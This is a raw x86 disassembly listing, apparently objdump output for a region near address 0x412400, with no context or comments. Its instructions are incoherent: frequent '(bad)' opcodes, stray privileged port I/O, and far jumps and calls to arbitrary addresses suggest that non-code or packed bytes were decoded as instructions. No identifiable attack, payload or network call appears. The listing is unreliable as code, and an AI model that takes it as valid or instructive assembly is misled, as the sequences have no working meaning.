  412401:	jns    0x41247d
  412403:	imul   ebx,DWORD PTR [esi],0xffffffe7
  412406:	(bad)  
  412407:	loope  0x4123b1
  412409:	add    esi,DWORD PTR [edi+0x3e19f795]
  41240f:	push   eax
  412410:	jne    0x4123c5
  412412:	(bad)
  412416:	call   0xf7cd:0xbcaceeb4
  41241d:	add    edx,DWORD PTR [ebx+0x5f]
  412420:	push   ecx
  412421:	add    esp,DWORD PTR [edi+esi*4-0x2a]
  412425:	ss ss inc ebx
  412428:	jae    0x412473
  41242a:	ror    DWORD PTR [edi-0x39],0x36
  41242e:	push   edx
  41242f:	push   eax
  412430:	xor    eax,0x154c99fc
  412435:	lods   eax,DWORD PTR ds:[esi]
  412436:	test   al,0xe1
  412438:	and    al,0xb0
  41243a:	mov    al,ds:0x12acfbc5
  41243f:	arpl   WORD PTR [edi-0x68b00d8c],cx
  412445:	lods   al,BYTE PTR ds:[esi]
  412446:	adc    ah,BYTE PTR [edi-0x72]
  412449:	ss ss inc ebx
  41244c:	push   esp
  41244d:	dec    esi
  41244e:	jns    0x41249f
  412450:	jno    0x412498
  412452:	jbe    0x4124a3
  412454:	add    esp,edi
  412456:	push   ecx
  412457:	push   eax
  412458:	je     0x41243b
  41245a:	(bad)
  41245d:	data16 add BYTE PTR [eax],al
	...
  412488:	stos   BYTE PTR es:[edi],al
  412489:	push   eax
  41248a:	je     0x412481
  41248c:	mov    ds:0x7d4108c6,al
  412491:	scas   al,BYTE PTR es:[edi]
  412492:	std    
  412493:	dec    esi
  412494:	(bad)  
  412495:	xchg   esi,eax
  412496:	adc    al,0x6a
  412498:	and    eax,0xbeed724f
  41249d:	iret   
  41249e:	cld    
  41249f:	in     al,0x71
  4124a1:	pusha  
  4124a2:	sub    DWORD PTR [ecx+edx*8-0x9118ba9],0xff305e0e
  4124ad:	push   0x0
  4124af:	dec    eax
  4124b0:	push   ecx
  4124b1:	fnstsw WORD PTR [edi]
  4124b3:	jmp    0xac795ba4
  4124b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124b9:	enter  0xd205,0xfd
  4124bd:	lods   eax,DWORD PTR ds:[esi]
  4124be:	(bad)  
  4124bf:	sub    edx,DWORD PTR [ecx+0x5b]
  4124c2:	sub    DWORD PTR [ecx+edx*4+0x57],0xc7a4f773
  4124ca:	adc    al,0xde
  4124cc:	packsswb mm5,mm0
  4124cf:	add    DWORD PTR [edi+0x4e],esi
  4124d2:	(bad)  
  4124d3:	pusha  
  4124d4:	jg     0x4124f9
  4124d6:	imul   ebp,ecx,0xd1005c3d
  4124dc:	mov    esp,0x2bb6fdbc
  4124e1:	xchg   edi,eax
  4124e2:	hlt    
  4124e3:	add    dl,ch
  4124e5:	inc    ecx
  4124e6:	adc    esp,DWORD PTR [esi+0x14fd674f]
	...
  412514:	add    BYTE PTR [eax],al
  412516:	xchg   edx,eax
  412517:	ss xor al,0x34
  41251a:	aad    0x4d
  41251c:	mov    dh,BYTE PTR [esi+ecx*8]
  41251f:	jecxz  0x412525
  412521:	add    ch,bh
  412523:	cdq    
  412524:	cmp    DWORD PTR [ebp-0x41],edi
  412527:	test   edi,esp
  412529:	mov    ebx,DWORD PTR [edx]
  41252b:	imul   eax,DWORD PTR [ecx+0xd8b5738],0xffffffff
  412532:	jp     0x412532
  412534:	in     eax,0x41
  412536:	test   DWORD PTR [ecx],eax
  412538:	jmp    FWORD PTR [ebx]
  41253a:	pop    ss
  41253b:	mov    ds:0x5a4bc2c7,al
  412540:	cmp    DWORD PTR [ebp-0x7d],0xb8850d5c
  412547:	push   esi
  412548:	add    BYTE PTR [eax],al
  41254a:	cmp    al,0x2
  41254c:	jmp    0x4125bc
  41254e:	pushf  
  41254f:	lods   al,BYTE PTR ds:[esi]
  412550:	hlt    
  412551:	mov    ebp,DWORD PTR [ebx]
  412553:	rol    BYTE PTR [edx],0x45
  412556:	aaa    
  412557:	ins    DWORD PTR es:[edi],dx
  412558:	add    BYTE PTR [eax+0x30],dl
  41255b:	mov    WORD PTR [eax],cs
  41255d:	call   0x3ec5ce
  412562:	inc    eax
  412563:	mov    WORD PTR [edi+edi*8],ss
  412566:	push   0x52
  412568:	out    0xb9,al
  41256a:	rol    DWORD PTR [eax],cl
  41256c:	dec    DWORD PTR [ecx+0x68059a]
  412572:	loopne 0x4124fe
  412574:	adc    al,0xff
  412576:	push   0x4f
  412578:	out    0x49,al
	...
  4125a2:	add    BYTE PTR [eax],al
  4125a4:	out    dx,eax
  4125a5:	add    bh,bh
  4125a7:	mov    esp,DWORD PTR [edx]
  4125a9:	imul   eax,DWORD PTR [ecx+0xd8aa739],0xffffffff
  4125b0:	push   0xb
  4125b2:	out    0xed,al
  4125b4:	test   BYTE PTR [ecx],0xff
  4125b7:	sub    edx,edi
  4125b9:	mov    al,ds:0x599bc2c7
  4125be:	std    
  4125bf:	jne    0x412600
  4125c1:	add    dh,BYTE PTR [ebp+0x14]
  4125c4:	ds in  eax,0x30
  4125c7:	int3   
  4125c8:	and    DWORD PTR [esi-0x8],0x9a4bf3fe
  4125cf:	xchg   edx,eax
  4125d0:	jo     0x41259e
  4125d2:	stos   BYTE PTR es:[edi],al
  4125d3:	or     bh,BYTE PTR [esi+0x4e]
  4125d6:	sti    
  4125d7:	(bad)  
  4125d8:	jmp    0x4125a1
  4125da:	cdq    
  4125db:	(bad)
  4125de:	stos   BYTE PTR es:[edi],al
  4125df:	sub    bh,BYTE PTR [esi+0xc]
  4125e2:	mov    ebp,0x434432c1
  4125e7:	cmp    eax,ebx
  4125e9:	stos   DWORD PTR es:[edi],eax
  4125ea:	xor    ecx,DWORD PTR [ebp-0xf5efc7]
  4125f0:	stos   DWORD PTR es:[edi],eax
  4125f1:	es stos DWORD PTR es:[edi],eax
  4125f3:	je     0x4125eb
  4125f5:	test   DWORD PTR [eax],esi
  4125f7:	or     al,0x21
  4125f9:	or     dl,bh
  4125fb:	out    0xa0,eax
  4125fd:	je     0x4125a9
  4125ff:	inc    BYTE PTR [ebp-0x7e]
  412602:	cli    
  412603:	test   BYTE PTR [ebx+eax*2+0x2],ch
	...
  41262f:	add    BYTE PTR [eax],al
  412631:	add    BYTE PTR [ecx],al
  412633:	call   0xe4150de5
  412638:	stos   BYTE PTR es:[edi],al
  412639:	(bad)  
  41263a:	and    eax,0xfcc94a82
  41263f:	cs add ch,cl
  412642:	and    BYTE PTR [ebx+0x2],al
  412645:	add    BYTE PTR [ebp+0x410ca8b7],bh
  41264b:	mov    bh,0xf0
  41264d:	add    BYTE PTR [esi],bh
  41264f:	inc    edx
  412650:	(bad)  
  412652:	xlat   BYTE PTR ds:[ebx]
  412653:	push   esi
  412654:	add    DWORD PTR [eax],eax
  412656:	ds leave 
  412658:	dec    ebp
  412659:	hlt    
  41265a:	lds    esi,FWORD PTR [esi]
  41265c:	ins    BYTE PTR es:[edi],dx
  41265d:	add    al,BYTE PTR [ebx]
  41265f:	adc    bl,BYTE PTR [edi]
  412661:	add    BYTE PTR [esi],cl
  412663:	std    
  412664:	sub    eax,0xee5ba608
  412669:	dec    edx
  41266a:	xchg   ecx,eax
  41266b:	dec    esp
  41266c:	adc    al,BYTE PTR [ecx+ecx*4]
  41266f:	(bad)  
  412670:	sti    
  412671:	test   al,0xa
  412673:	arpl   WORD PTR [edi+0x65],di
  412676:	jo     0x4126c4
  412678:	xchg   DWORD PTR [ebp+0x2],edi
  41267b:	addr16 push 0xffffffeb
  41267e:	imul   eax,edi,0x46eaa8e6
  412684:	add    BYTE PTR [ecx-0x21],0x4b
  412688:	fst    QWORD PTR [bx+di+0x30ac]
  41268d:	(bad)  
  41268e:	sub    eax,0xcdd5e25b
  412693:	push   ebp
  412694:	inc    eax
  412695:	cwde   
	...
  4126be:	add    BYTE PTR [eax],al
  4126c0:	cmp    DWORD PTR [eax+ebp*8+0x7a],ecx
  4126c4:	jp     0x412705
  4126c6:	rol    BYTE PTR [ebx],cl
  4126c8:	sub    esi,eax
  4126ca:	fld    TBYTE PTR [eax+0x353f63aa]
  4126d0:	adc    DWORD PTR [edi+eiz*1+0x7d],ecx
  4126d4:	and    BYTE PTR [edi+0x6a],0xeb
  4126d8:	or     edi,eax
  4126da:	out    0xa8,al
  4126dc:	mov    al,BYTE PTR [edi+0x0]
  4126df:	adc    DWORD PTR [edi+0x4c],ebx
  4126e2:	pop    es
  4126e3:	fnsave [ecx+0x4dc630ab]
  4126e9:	pop    ebx
  4126ea:	imul   dh
  4126ec:	ins    DWORD PTR es:[edi],dx
  4126ed:	(bad)  [eax-0x306a36fd]
  4126f3:	jl     0x41276f
  4126f5:	inc    ebx
  4126f6:	imul   ebx,DWORD PTR [ebx-0x137e5cb],0x14
  4126fd:	sub    DWORD PTR [ecx-0x17b44658],edx
  412703:	mov    al,0xae
  412705:	xlat   BYTE PTR ds:[ebx]
  412706:	iret   
  412707:	adc    BYTE PTR [edi-0x4536ff6b],dh
  41270d:	mov    esi,0x971b0ae8
  412712:	in     al,dx
  412713:	loop   0x412765
  412715:	inc    ebx
  412716:	jbe    0x412703
  412718:	stos   BYTE PTR es:[edi],al
  412719:	sub    BYTE PTR [ecx],0xbb
  41271c:	add    dl,BYTE PTR [edi+0x3b38c2ec]
  412722:	mov    dh,BYTE PTR [eax+eax*1]
	...
  41274d:	add    dl,dl
  41274f:	fdivr  DWORD PTR [edi+0x542c2ca]
  412755:	jle    0x412703
  412757:	pop    eax
  412758:	push   ebx
  412759:	mov    esp,edx
  41275b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41275c:	in     al,0x72
  41275e:	adc    BYTE PTR [ebx+0x3a],al
  412761:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412762:	test   eax,0x6203c8
  412767:	cmp    ebp,edx
  412769:	jmp    0x6f60:0x46e49fba
  412770:	std    
  412771:	mov    ah,0xd1
  412773:	call   0x36a0:0x4325bcfd
  41277a:	out    0x49,al
  41277c:	or     ch,BYTE PTR [ecx]
  41277e:	pusha  
  41277f:	pop    edx
  412780:	std    
  412781:	xchg   esp,eax
  412782:	fld    DWORD PTR [edx-0x64]
  412785:	mov    esi,edx
  412787:	dec    ecx
  412788:	sub    ch,BYTE PTR [ecx]
  41278a:	xchg   BYTE PTR [ebx+eax*8],dl
  41278d:	fnstsw WORD PTR ds:0x6a1d43d4
  412793:	sbb    cl,BYTE PTR [esp+ebp*4-0x5b74650f]
  41279a:	add    eax,0xc4d1529b
  41279f:	inc    ebp
  4127a0:	(bad)  
  4127a1:	fimul  WORD PTR [ebx-0x61]
  4127a4:	rcl    dh,1
  4127a6:	(bad)  
  4127a8:	jmp    0xfe8b3183
  4127ad:	add    BYTE PTR [esp+esi*2],ah
  4127b0:	rol    BYTE PTR [eax],1
	...
  4127da:	add    BYTE PTR [eax],al
  4127dc:	jae    0x412832
  4127de:	cmp    DWORD PTR [ebp-0x31],0xe817745f
  4127e5:	mov    esp,ss
  4127e7:	push   DWORD PTR [edx]
  4127e9:	pop    ss
  4127ea:	push   DWORD PTR [ebp-0x65]
  4127ed:	add    DWORD PTR [ebp+0x8],esi
  4127f0:	test   al,0xac
  4127f2:	sbb    bh,bh
  4127f4:	push   edx
  4127f5:	pop    ss
  4127f6:	out    0x2,al
  4127f8:	mov    esp,0x7c47ff02
  4127fd:	jae    0x4127f7
  4127ff:	pmullw mm5,QWORD PTR ds:0x1e8fffc
  412806:	jne    0x4127fc
  412808:	out    dx,eax
  412809:	popf   
  41280a:	pusha  
  41280b:	(bad)  
  41280c:	call   0x574128c7
  412811:	pop    esi
  412812:	pop    ebp
  412813:	leave  
  412814:	imul   eax,DWORD PTR gs:[eax],0x55
  412818:	lods   al,BYTE PTR ds:[esi]
  412819:	jecxz  0x412871
  41281b:	push   edx
  41281d:	inc    ebp
  41281e:	out    0xd2,al
  412820:	stc    
  412821:	add    bh,bh
  412823:	push   0x3f7b33
  412828:	pop    eax
  412829:	mov    WORD PTR [eax],cs
  41282b:	call   0x41abc3
  412830:	sbb    al,0x1e
  412832:	jne    0x412839
  412834:	test   al,0x6
  412836:	ror    BYTE PTR [eax],0xe7
  412839:	pop    es
  41283a:	(bad)  
  41283b:	(bad)  
  41283c:	call   0x12930cb
	...
  412869:	add    BYTE PTR [esi],ah
  41286b:	jno    0x41286a
  41286d:	jmp    FWORD PTR [eax]
  41286f:	sbb    DWORD PTR [edx+0x41],esp
  412872:	out    0x0,eax
  412874:	jne    0x41287e
  412876:	adc    bh,ah
  412878:	jae    0x4128c5
  41287a:	ds xor al,0x2
  41287d:	or     edi,DWORD PTR [esi-0x52]
  412880:	call   FWORD PTR [esi-0x79]
  412883:	cmc    
  412884:	stc    
  412885:	jmp    DWORD PTR [ebp-0x5e473dbc]
  41288b:	adc    BYTE PTR [edi-0x16367302],ah
  412891:	push   es
  412892:	or     edx,esp
  412894:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412895:	je     0x4128cd
  412897:	in     al,dx
  412898:	jo     0x4128e3
  41289a:	ds xor al,0xfb
  41289d:	mov    edi,0xc9473ef3
  4128a2:	jl     0x4128ef
  4128a4:	add    ch,BYTE PTR [eax+0x40]
  4128a7:	pop    edi
  4128a8:	inc    ebx
  4128a9:	add    BYTE PTR [ecx+0x46],ah
  4128ac:	cli    
  4128ad:	out    0xff,eax
  4128af:	jl     0x4128b5
  4128b1:	add    BYTE PTR [ebp+0x74],al
  4128b4:	xor    BYTE PTR [ecx],cl
  4128b6:	dec    ecx
  4128b7:	test   BYTE PTR cs:[esi+0x4074303b],0x3e
  4128bf:	sbb    dl,BYTE PTR ds:0xa7327f65
  4128c5:	je     0x4128fd
  4128c7:	stos   BYTE PTR es:[edi],al
  4128c8:	fimul  WORD PTR [edx+0x3e]
  4128cb:	xor    bh,bl
  4128cd:	mov    edi,0x0
	...
  4128f6:	add    BYTE PTR [eax],al
  4128f8:	xchg   ebx,eax
  4128f9:	cmp    esp,DWORD PTR [edi+0xd14274]
  4128ff:	cmp    BYTE PTR [eax+0x5e6801f3],0xd7
  412906:	inc    esp
  412907:	add    cl,bh
  412909:	out    dx,eax
  41290a:	stc    
  41290b:	out    0x43,eax
  41290d:	or     eax,0x72350002
  412912:	xor    BYTE PTR [ecx],cl
  412914:	loope  0x4128dd
  412916:	cmc    
  412917:	mov    es,WORD PTR [ebx-0x42]
  41291a:	jae    0x41295c
  41291c:	ds pop ebx
  41291e:	lahf   
  41291f:	add    edi,DWORD PTR [esi]
  412921:	pop    ebx
  412922:	out    0x44,eax
  412924:	neg    DWORD PTR ds:0xd41303e0
  41292a:	mov    ebx,0x1e4f7d81
  41292f:	dec    ebp
  412930:	push   ss
  412931:	sub    eax,DWORD PTR [ebx+eax*2+0x3e]
  412935:	dec    eax
  412936:	cmp    eax,0x2326a1fc
  41293b:	add    al,0x3e
  41293d:	push   esp
  41293e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41293f:	das    
  412940:	inc    eax
  412941:	test   al,0x3d
  412943:	mov    ebx,0x43e75f7f
  412948:	lds    ecx,FWORD PTR [ebx+0x63]
  41294b:	daa    
  41294c:	inc    esi
  41294d:	xor    al,0xe9
  41294f:	pop    edi
  412950:	jmp    0x647010dd
  412955:	(bad)  
  412956:	call   ecx
  412958:	fstp   QWORD PTR [ecx+0xa4e7]
	...
  412986:	retf   0x4f52
  412989:	ins    DWORD PTR es:[edi],dx
  41298a:	hlt    
  41298b:	pop    edx
  41298c:	out    0xf8,eax
  41298e:	or     esi,0x129844ed
  412994:	sub    al,BYTE PTR [eax]
  412996:	ds aam 0xc4
  412999:	sti    
  41299a:	adc    al,0x7d
  41299c:	addr16 in eax,0x36
  41299f:	iret   
  4129a0:	rol    BYTE PTR [ebx+0xfb35658],1
  4129a6:	mov    esi,0x392ff187
  4129ab:	fcmovnu st,st(6)
  4129ad:	dec    eax
  4129ae:	mov    dl,BYTE PTR [ebp+0x67]
  4129b1:	in     eax,0x9a
  4129b3:	iret   
  4129b4:	in     al,0x83
  4129b6:	xor    BYTE PTR [ebx+0x6000007c],bh
  4129bc:	(bad)  
  4129bd:	cmp    al,0xbe
  4129bf:	xchg   DWORD PTR [eax],eax
  4129c1:	jmp    0xa5074bee
  4129c6:	cdq    
  4129c7:	inc    edi
  4129c8:	(bad)  
  4129c9:	jmp    0xe1854a0b
  4129ce:	cmp    eax,0x36e9005b
  4129d3:	(bad)  
  4129d4:	or     dl,al
  4129d6:	jbe    0x4129b3
  4129d8:	cmp    eax,0x8174590e
  4129dd:	cmp    al,0xd6
  4129df:	inc    edi
  4129e0:	jne    0x4129bd
  4129e2:	jmp    0x5b:0x3de8f89e
  4129e9:	sbb    al,0x0
	...
  412a13:	add    BYTE PTR [esi],dh
  412a15:	and    BYTE PTR [ebp+ebx*4+0x3c],al
  412a19:	pop    ebx
  412a1a:	add    cl,ch
  412a1c:	(bad)  
  412a1d:	ins    BYTE PTR es:[edi],dx
  412a1e:	cmc    
  412a1f:	and    al,0xa2
  412a21:	pop    edx
  412a22:	add    cl,ch
  412a24:	cmp    eax,0x62a70ace
  412a29:	lds    ebp,FWORD PTR [si]
  412a2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a2d:	inc    edi
  412a2e:	(bad)  
  412a2f:	jmp    0xc57f0571
  412a34:	sbb    BYTE PTR [esi-0x3],bl
  412a37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a38:	xchg   ebp,eax
  412a39:	xor    al,0x6
  412a3b:	cs js  0x412a81
  412a3e:	add    ecx,ebp
  412a40:	cmp    eax,0xe1c4815b
  412a45:	pop    ebx
  412a46:	jae    0x412a32
  412a48:	jecxz  0x412aa7
  412a4a:	and    BYTE PTR [esi-0x4bff7a43],ch
  412a50:	(bad)  
  412a51:	sar    DWORD PTR [ebx-0xf],1
  412a54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a55:	bound  eax,QWORD PTR [eax+0x16d01dde]
  412a5b:	imul   esp,DWORD PTR [edx],0x4d94205c
  412a61:	scas   al,BYTE PTR es:[edi]
  412a62:	jmp    0x47060367
  412a67:	add    DWORD PTR [edi+0x47],ebp
  412a6a:	inc    edi
  412a6b:	adc    BYTE PTR [eax-0x3f0a8ca6],0x8f
  412a72:	inc    ebp
  412a73:	and    BYTE PTR [eax],0x5f
  412a76:	jae    0x412a57
	...
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	cwde   
  412aa3:	xchg   esp,eax
  412aa4:	hlt    
  412aa5:	add    BYTE PTR [edi+0xa8b005a],ah
  412aab:	push   edi
  412aac:	mov    DWORD PTR [ebp-0x51],edi
  412aaf:	cmc    
  412ab0:	pop    ds
  412ab1:	and    BYTE PTR [eax-0x16e38aca],0x52
  412ab8:	add    bh,bh
  412aba:	dec    edx
  412abb:	jecxz  0x412b10
  412abd:	call   0x40272e
  412ac2:	mov    WORD PTR [edx],ds
  412ac4:	jne    0x412acc
  412ac6:	xor    BYTE PTR [ecx+0x5a5bc2c7],bl
  412acc:	mov    edi,esi
  412ace:	sbb    edx,edi
  412ad0:	inc    esp
  412ad1:	hlt    
  412ad2:	sbb    bh,bl
  412ad4:	add    BYTE PTR ds:[edx+0x7],bl
  412ad8:	push   DWORD PTR [ebp-0x35]
  412adb:	sub    al,0xc
  412ade:	loope  0x412ad9
  412ae0:	(bad)  
  412ae1:	pop    edi
  412ae2:	adc    DWORD PTR [edi],0x832704c0
  412ae8:	mov    esp,ebp
  412aea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412aeb:	adc    eax,esi
  412aed:	push   esi
  412aee:	enter  0x7cdc,0x14
  412af2:	pop    ss
  412af3:	outs   dx,BYTE PTR ds:[esi]
  412af4:	pop    es
  412af5:	adc    DWORD PTR [edx],0xffffffd2
  412af8:	dec    edx
  412af9:	inc    ecx
  412afa:	daa    
  412afb:	pop    edx
  412afc:	jae    0x412b04
  412afe:	add    BYTE PTR [edi+eax*8-0x76a5f83e],bl
  412b05:	inc    ebp
	...
  412b2e:	add    BYTE PTR [eax],al
  412b30:	ds dec eax
  412b32:	fld    QWORD PTR [edx+esi*2]
  412b35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b36:	inc    ebx
  412b37:	add    BYTE PTR [ecx],bh
  412b39:	mov    cl,0x65
  412b3b:	add    BYTE PTR [esi],bh
  412b3d:	xor    al,0xdd
  412b3f:	add    al,0xbe
  412b41:	mov    ebp,0xb1410043
  412b46:	jns    0x412b48
  412b48:	ds xor al,0xdd
  412b4b:	add    al,0xba
  412b4d:	mov    ch,0x44
  412b4f:	add    BYTE PTR [ecx-0x4f],cl
  412b52:	mov    es,WORD PTR [eax]
  412b54:	ds xor al,0x91
  412b57:	inc    esp
  412b58:	mov    dl,0x63
  412b5a:	pop    DWORD PTR [esi+eiz*4+0x63]
  412b5e:	pop    DWORD PTR [edx+ebx*4+0x63]
  412b62:	mov    eax,ds:0x44a61234
  412b67:	add    BYTE PTR [ecx-0x3f180b9a],cl
  412b6d:	sti    
  412b6e:	mov    ds:0xac76cbfe,al
  412b73:	dec    edi
  412b74:	ret    
  412b75:	jle    0x412b27
  412b77:	dec    edi
  412b78:	mov    ebx,0x614f9476
  412b7d:	push   cs
  412b7e:	xchg   BYTE PTR [ebp+0x74a333ff],cl
  412b84:	fsub   QWORD PTR cs:[ebp-0x9]
  412b88:	dec    ecx
  412b89:	mov    esp,0x3624490
  412b8e:	xchg   ecx,eax
  412b8f:	inc    esp
  412b90:	push   ds
  412b91:	add    edx,DWORD PTR [ecx+0x44]
	...
  412bbb:	add    BYTE PTR [eax],al
  412bbd:	add    BYTE PTR [edx],bl
  412bbf:	add    esp,DWORD PTR [ebx+0x44ccbe34]
  412bc5:	add    BYTE PTR [ecx],ah
  412bc7:	adc    dl,dh
  412bc9:	out    0xc4,eax
  412bcb:	mov    ah,BYTE PTR [edx-0x59efee02]
  412bd1:	mov    es,WORD PTR [ebx-0x755dc4a5]
  412bd7:	daa    
  412bd8:	outs   dx,DWORD PTR ds:[esi]
  412bd9:	dec    eax
  412bda:	push   ss
  412bdb:	sbb    eax,0x44f1b3ad
  412be0:	call   0x33dfe6e8
  412be5:	xor    edx,DWORD PTR [edx+ebx*2-0x6f]
  412be9:	add    esp,DWORD PTR [ebx+ebx*2-0x7f]
  412bed:	add    esp,DWORD PTR [ebx+ebx*2+0x5c]
  412bf1:	dec    eax
  412bf2:	repnz stos DWORD PTR es:[edi],eax
  412bf4:	out    0xf7,al
  412bf6:	mov    ecx,0x45042890
  412bfb:	sbb    esp,edi
  412bfd:	xchg   DWORD PTR [edi+0x5a],eax
  412c00:	out    0x3,eax
  412c02:	mov    ebp,0x310497c6
  412c07:	(bad)  
  412c09:	add    bh,BYTE PTR [esi]
  412c0b:	pop    ebx
  412c0c:	bound  ecx,QWORD PTR [edi-0x7e]
  412c0f:	sbb    BYTE PTR [eax+ebp*4],0x38
  412c13:	fcomp  QWORD PTR [ebx-0x64a4c1fc]
  412c19:	(bad)  
  412c1a:	repnz sub ah,BYTE PTR [ebx+0x1f]
  412c1e:	xchg   edx,eax
  412c1f:	rcr    BYTE PTR [eax+edx*8],1
	...
  412c4a:	add    BYTE PTR [eax],al
  412c4c:	pop    esp
  412c4d:	pop    ecx
  412c4e:	jp     0x412cb8
  412c50:	pusha  
  412c51:	into   
  412c52:	stos   DWORD PTR es:[edi],eax
  412c53:	xchg   ecx,eax
  412c54:	add    bh,BYTE PTR [edi]
  412c56:	ja     0x412c6f
  412c58:	outs   dx,BYTE PTR ds:[esi]
  412c59:	xor    edi,DWORD PTR [eax+0x6a5b3e4b]
  412c5f:	pop    ds
  412c60:	inc    edx
  412c61:	pop    ebx
  412c62:	out    dx,al
  412c63:	xchg   DWORD PTR [ebx],ecx
  412c65:	pop    ebx
  412c66:	out    0x3,eax
  412c68:	mov    ebp,0x390457c5
  412c6d:	fild   QWORD PTR [ebx]
  412c6f:	add    al,0x3e
  412c71:	pop    ebx
  412c72:	push   0x1f
  412c74:	and    bl,BYTE PTR [ebx+0x0]
  412c77:	out    0xb9,al
  412c79:	add    DWORD PTR [ecx],eax
  412c7b:	jmp    0x25b570bd
  412c80:	rol    BYTE PTR [edx-0x2d60e1a5],cl
  412c86:	inc    ebx
  412c87:	and    DWORD PTR [edi+0x510efcce],ebx
  412c8d:	adc    edi,esi
  412c8f:	jl     0x412c5a
  412c91:	cmp    ebx,DWORD PTR [esi-0x64]
  412c94:	sahf   
  412c95:	inc    esp
  412c96:	imul   eax,esi,0x1009a18
  412c9c:	mov    DWORD PTR [eax+eax*1+0x2db30de9],ebx
  412ca3:	inc    esp
  412ca4:	std    
  412ca5:	pop    edx
  412ca6:	std    
  412ca7:	pop    esp
  412ca8:	cmp    BYTE PTR [ebx],0x84
  412cab:	and    BYTE PTR [edx+0x5b],al
  412cae:	or     DWORD PTR [ecx+0x0],ebp
	...
  412cd8:	add    BYTE PTR [eax],al
  412cda:	dec    ecx
  412cdb:	arpl   WORD PTR [eax-0x9],bp
  412cde:	pusha  
  412cdf:	call   0xe900:0x9c7cc100
  412ce6:	dec    ebp
  412ce7:	mov    bl,0x36
  412ce9:	or     al,0xfd
  412ceb:	pop    edx
  412cec:	std    
  412ced:	adc    al,0x8a
  412cef:	cmp    ebp,DWORD PTR [eax+0x20]
  412cf2:	cmp    bl,BYTE PTR [ebx+0x9]
  412cf5:	test   eax,0xc7686351
  412cfa:	sbb    BYTE PTR [edx-0x631f6f00],bl
  412d00:	add    cl,ch
  412d02:	or     eax,0xfd043eb3
  412d07:	pop    edx
  412d08:	std    
  412d09:	fdiv   QWORD PTR [ebp+0x3b]
  412d0c:	dec    esp
  412d0d:	mov    al,0x3d
  412d0f:	pop    ebx
  412d10:	or     DWORD PTR [ecx],ebp
  412d12:	dec    eax
  412d13:	cwde   
  412d14:	push   0xbf323de9
  412d19:	add    BYTE PTR [eax+0x69],bh
  412d1c:	or     al,0xe8
  412d1e:	push   es
  412d1f:	xchg   ch,bh
  412d21:	dec    DWORD PTR [eax+0x29]
  412d24:	jbe    0x412cb4
  412d26:	(bad)  
  412d27:	pop    esi
  412d28:	std    
  412d29:	jne    0x412d36
  412d2b:	not    DWORD PTR [edx+0x59]
  412d2e:	pop    eax
  412d2f:	sti    
  412d30:	(bad)  
  412d31:	jne    0x412d7e
  412d33:	sti    
  412d34:	je     0x412d2a
  412d36:	cmp    BYTE PTR [ecx+0xc],ch
  412d39:	call   0x3eb2fa
	...
  412d66:	add    BYTE PTR [eax],al
  412d68:	fsubr  DWORD PTR [eax-0x10]
  412d6b:	call   DWORD PTR [edx-0xa]
  412d6e:	(bad)  
  412d6f:	jne    0x412d5c
  412d71:	imul   BYTE PTR [ecx+ebx*2-0x28]
  412d75:	loop   0x412d75
  412d77:	jne    0x412cfc
  412d79:	loop   0x412def
  412d7b:	fmul   QWORD PTR [eax+0x58e80c64]
  412d81:	cmp    ch,0xff
  412d84:	js     0x412dea
  412d86:	enter  0x57e8,0x9b
  412d8a:	std    
  412d8b:	jmp    FWORD PTR [eax]
  412d8d:	add    edi,0x535e67c2
  412d93:	mov    ebp,DWORD PTR [ebx-0x1b173e22]
  412d99:	jnp    0x412daf
  412d9b:	add    eax,0x112d358
  412da0:	push   edi
  412da1:	pop    esi
  412da2:	mov    eax,DWORD PTR [ebp-0x1d]
  412da5:	xchg   BYTE PTR [ebx-0x747840bb],cl
  412dab:	inc    ebp
  412dac:	retf   
  412dad:	xchg   BYTE PTR [edx+0x2],ch
  412db0:	fsub   DWORD PTR [ebx+0x10]
  412db3:	call   0x4017ee
  412db8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412db9:	jl     0x412db3
  412dbb:	add    DWORD PTR [esi],edi
  412dbd:	cmp    DWORD PTR [ecx+0x2343ef2],ecx
  412dc3:	jmp    FWORD PTR [ebx+0xe448d80]
  412dc9:	sub    al,0x9f
  412dcb:	arpl   WORD PTR [eax],ax
	...
  412df5:	add    BYTE PTR [edi+0x34],bh
  412df8:	lahf   
  412df9:	je     0x412e09
  412dfb:	pushf  
  412dfc:	jge    0x412e44
  412dfe:	ds xor al,0xb
  412e01:	ror    BYTE PTR [ecx-0x49],0xbc
  412e05:	push   ecx
  412e07:	xor    edx,DWORD PTR [ecx-0x6efc0dbc]
  412e0d:	inc    esp
  412e0e:	out    0xe3,al
  412e10:	nop
  412e11:	inc    esp
  412e12:	(bad)  
  412e14:	daa    
  412e15:	add    cl,dl
  412e17:	mov    esi,0x49e0e7f1
  412e1c:	lahf   
  412e1d:	(bad)  
  412e1e:	mov    ebp,0x49009cb6
  412e23:	mov    bh,0x59
  412e25:	push   DWORD PTR [ecx-0x4d8b60cd]
  412e2b:	fwait
  412e2c:	retf   0xff63
  412e2f:	xor    ebp,DWORD PTR [edx+0x2340145]
  412e35:	or     edi,DWORD PTR [esi+0x38]
  412e38:	mov    DWORD PTR [edx-0x72fdcbc2],esp
  412e3e:	sti    
  412e3f:	fbstp  TBYTE PTR [ecx]
  412e41:	lea    eax,[ebx]
  412e43:	cld    
  412e44:	xor    DWORD PTR [ebp+0x6a31e7fb],ecx
  412e4a:	cmp    eax,0x561018d1
  412e4f:	adc    BYTE PTR [ebx+0x20b459fe],0xf8
  412e56:	cmp    DWORD PTR ds:[ecx+0x82],ecx
	...
  412e81:	add    BYTE PTR [eax],al
  412e83:	add    BYTE PTR [esi],bh
  412e85:	xor    al,0x2
  412e87:	mov    edi,ebx
  412e89:	pop    edx
  412e8a:	pop    ebx
  412e8b:	sahf   
  412e8c:	imul   edx,eax,0x96c2afa4
  412e92:	pop    ebx
  412e93:	xor    edi,DWORD PTR [ebx-0x4cccb06a]
  412e99:	xchg   esi,eax
  412e9a:	inc    ebx
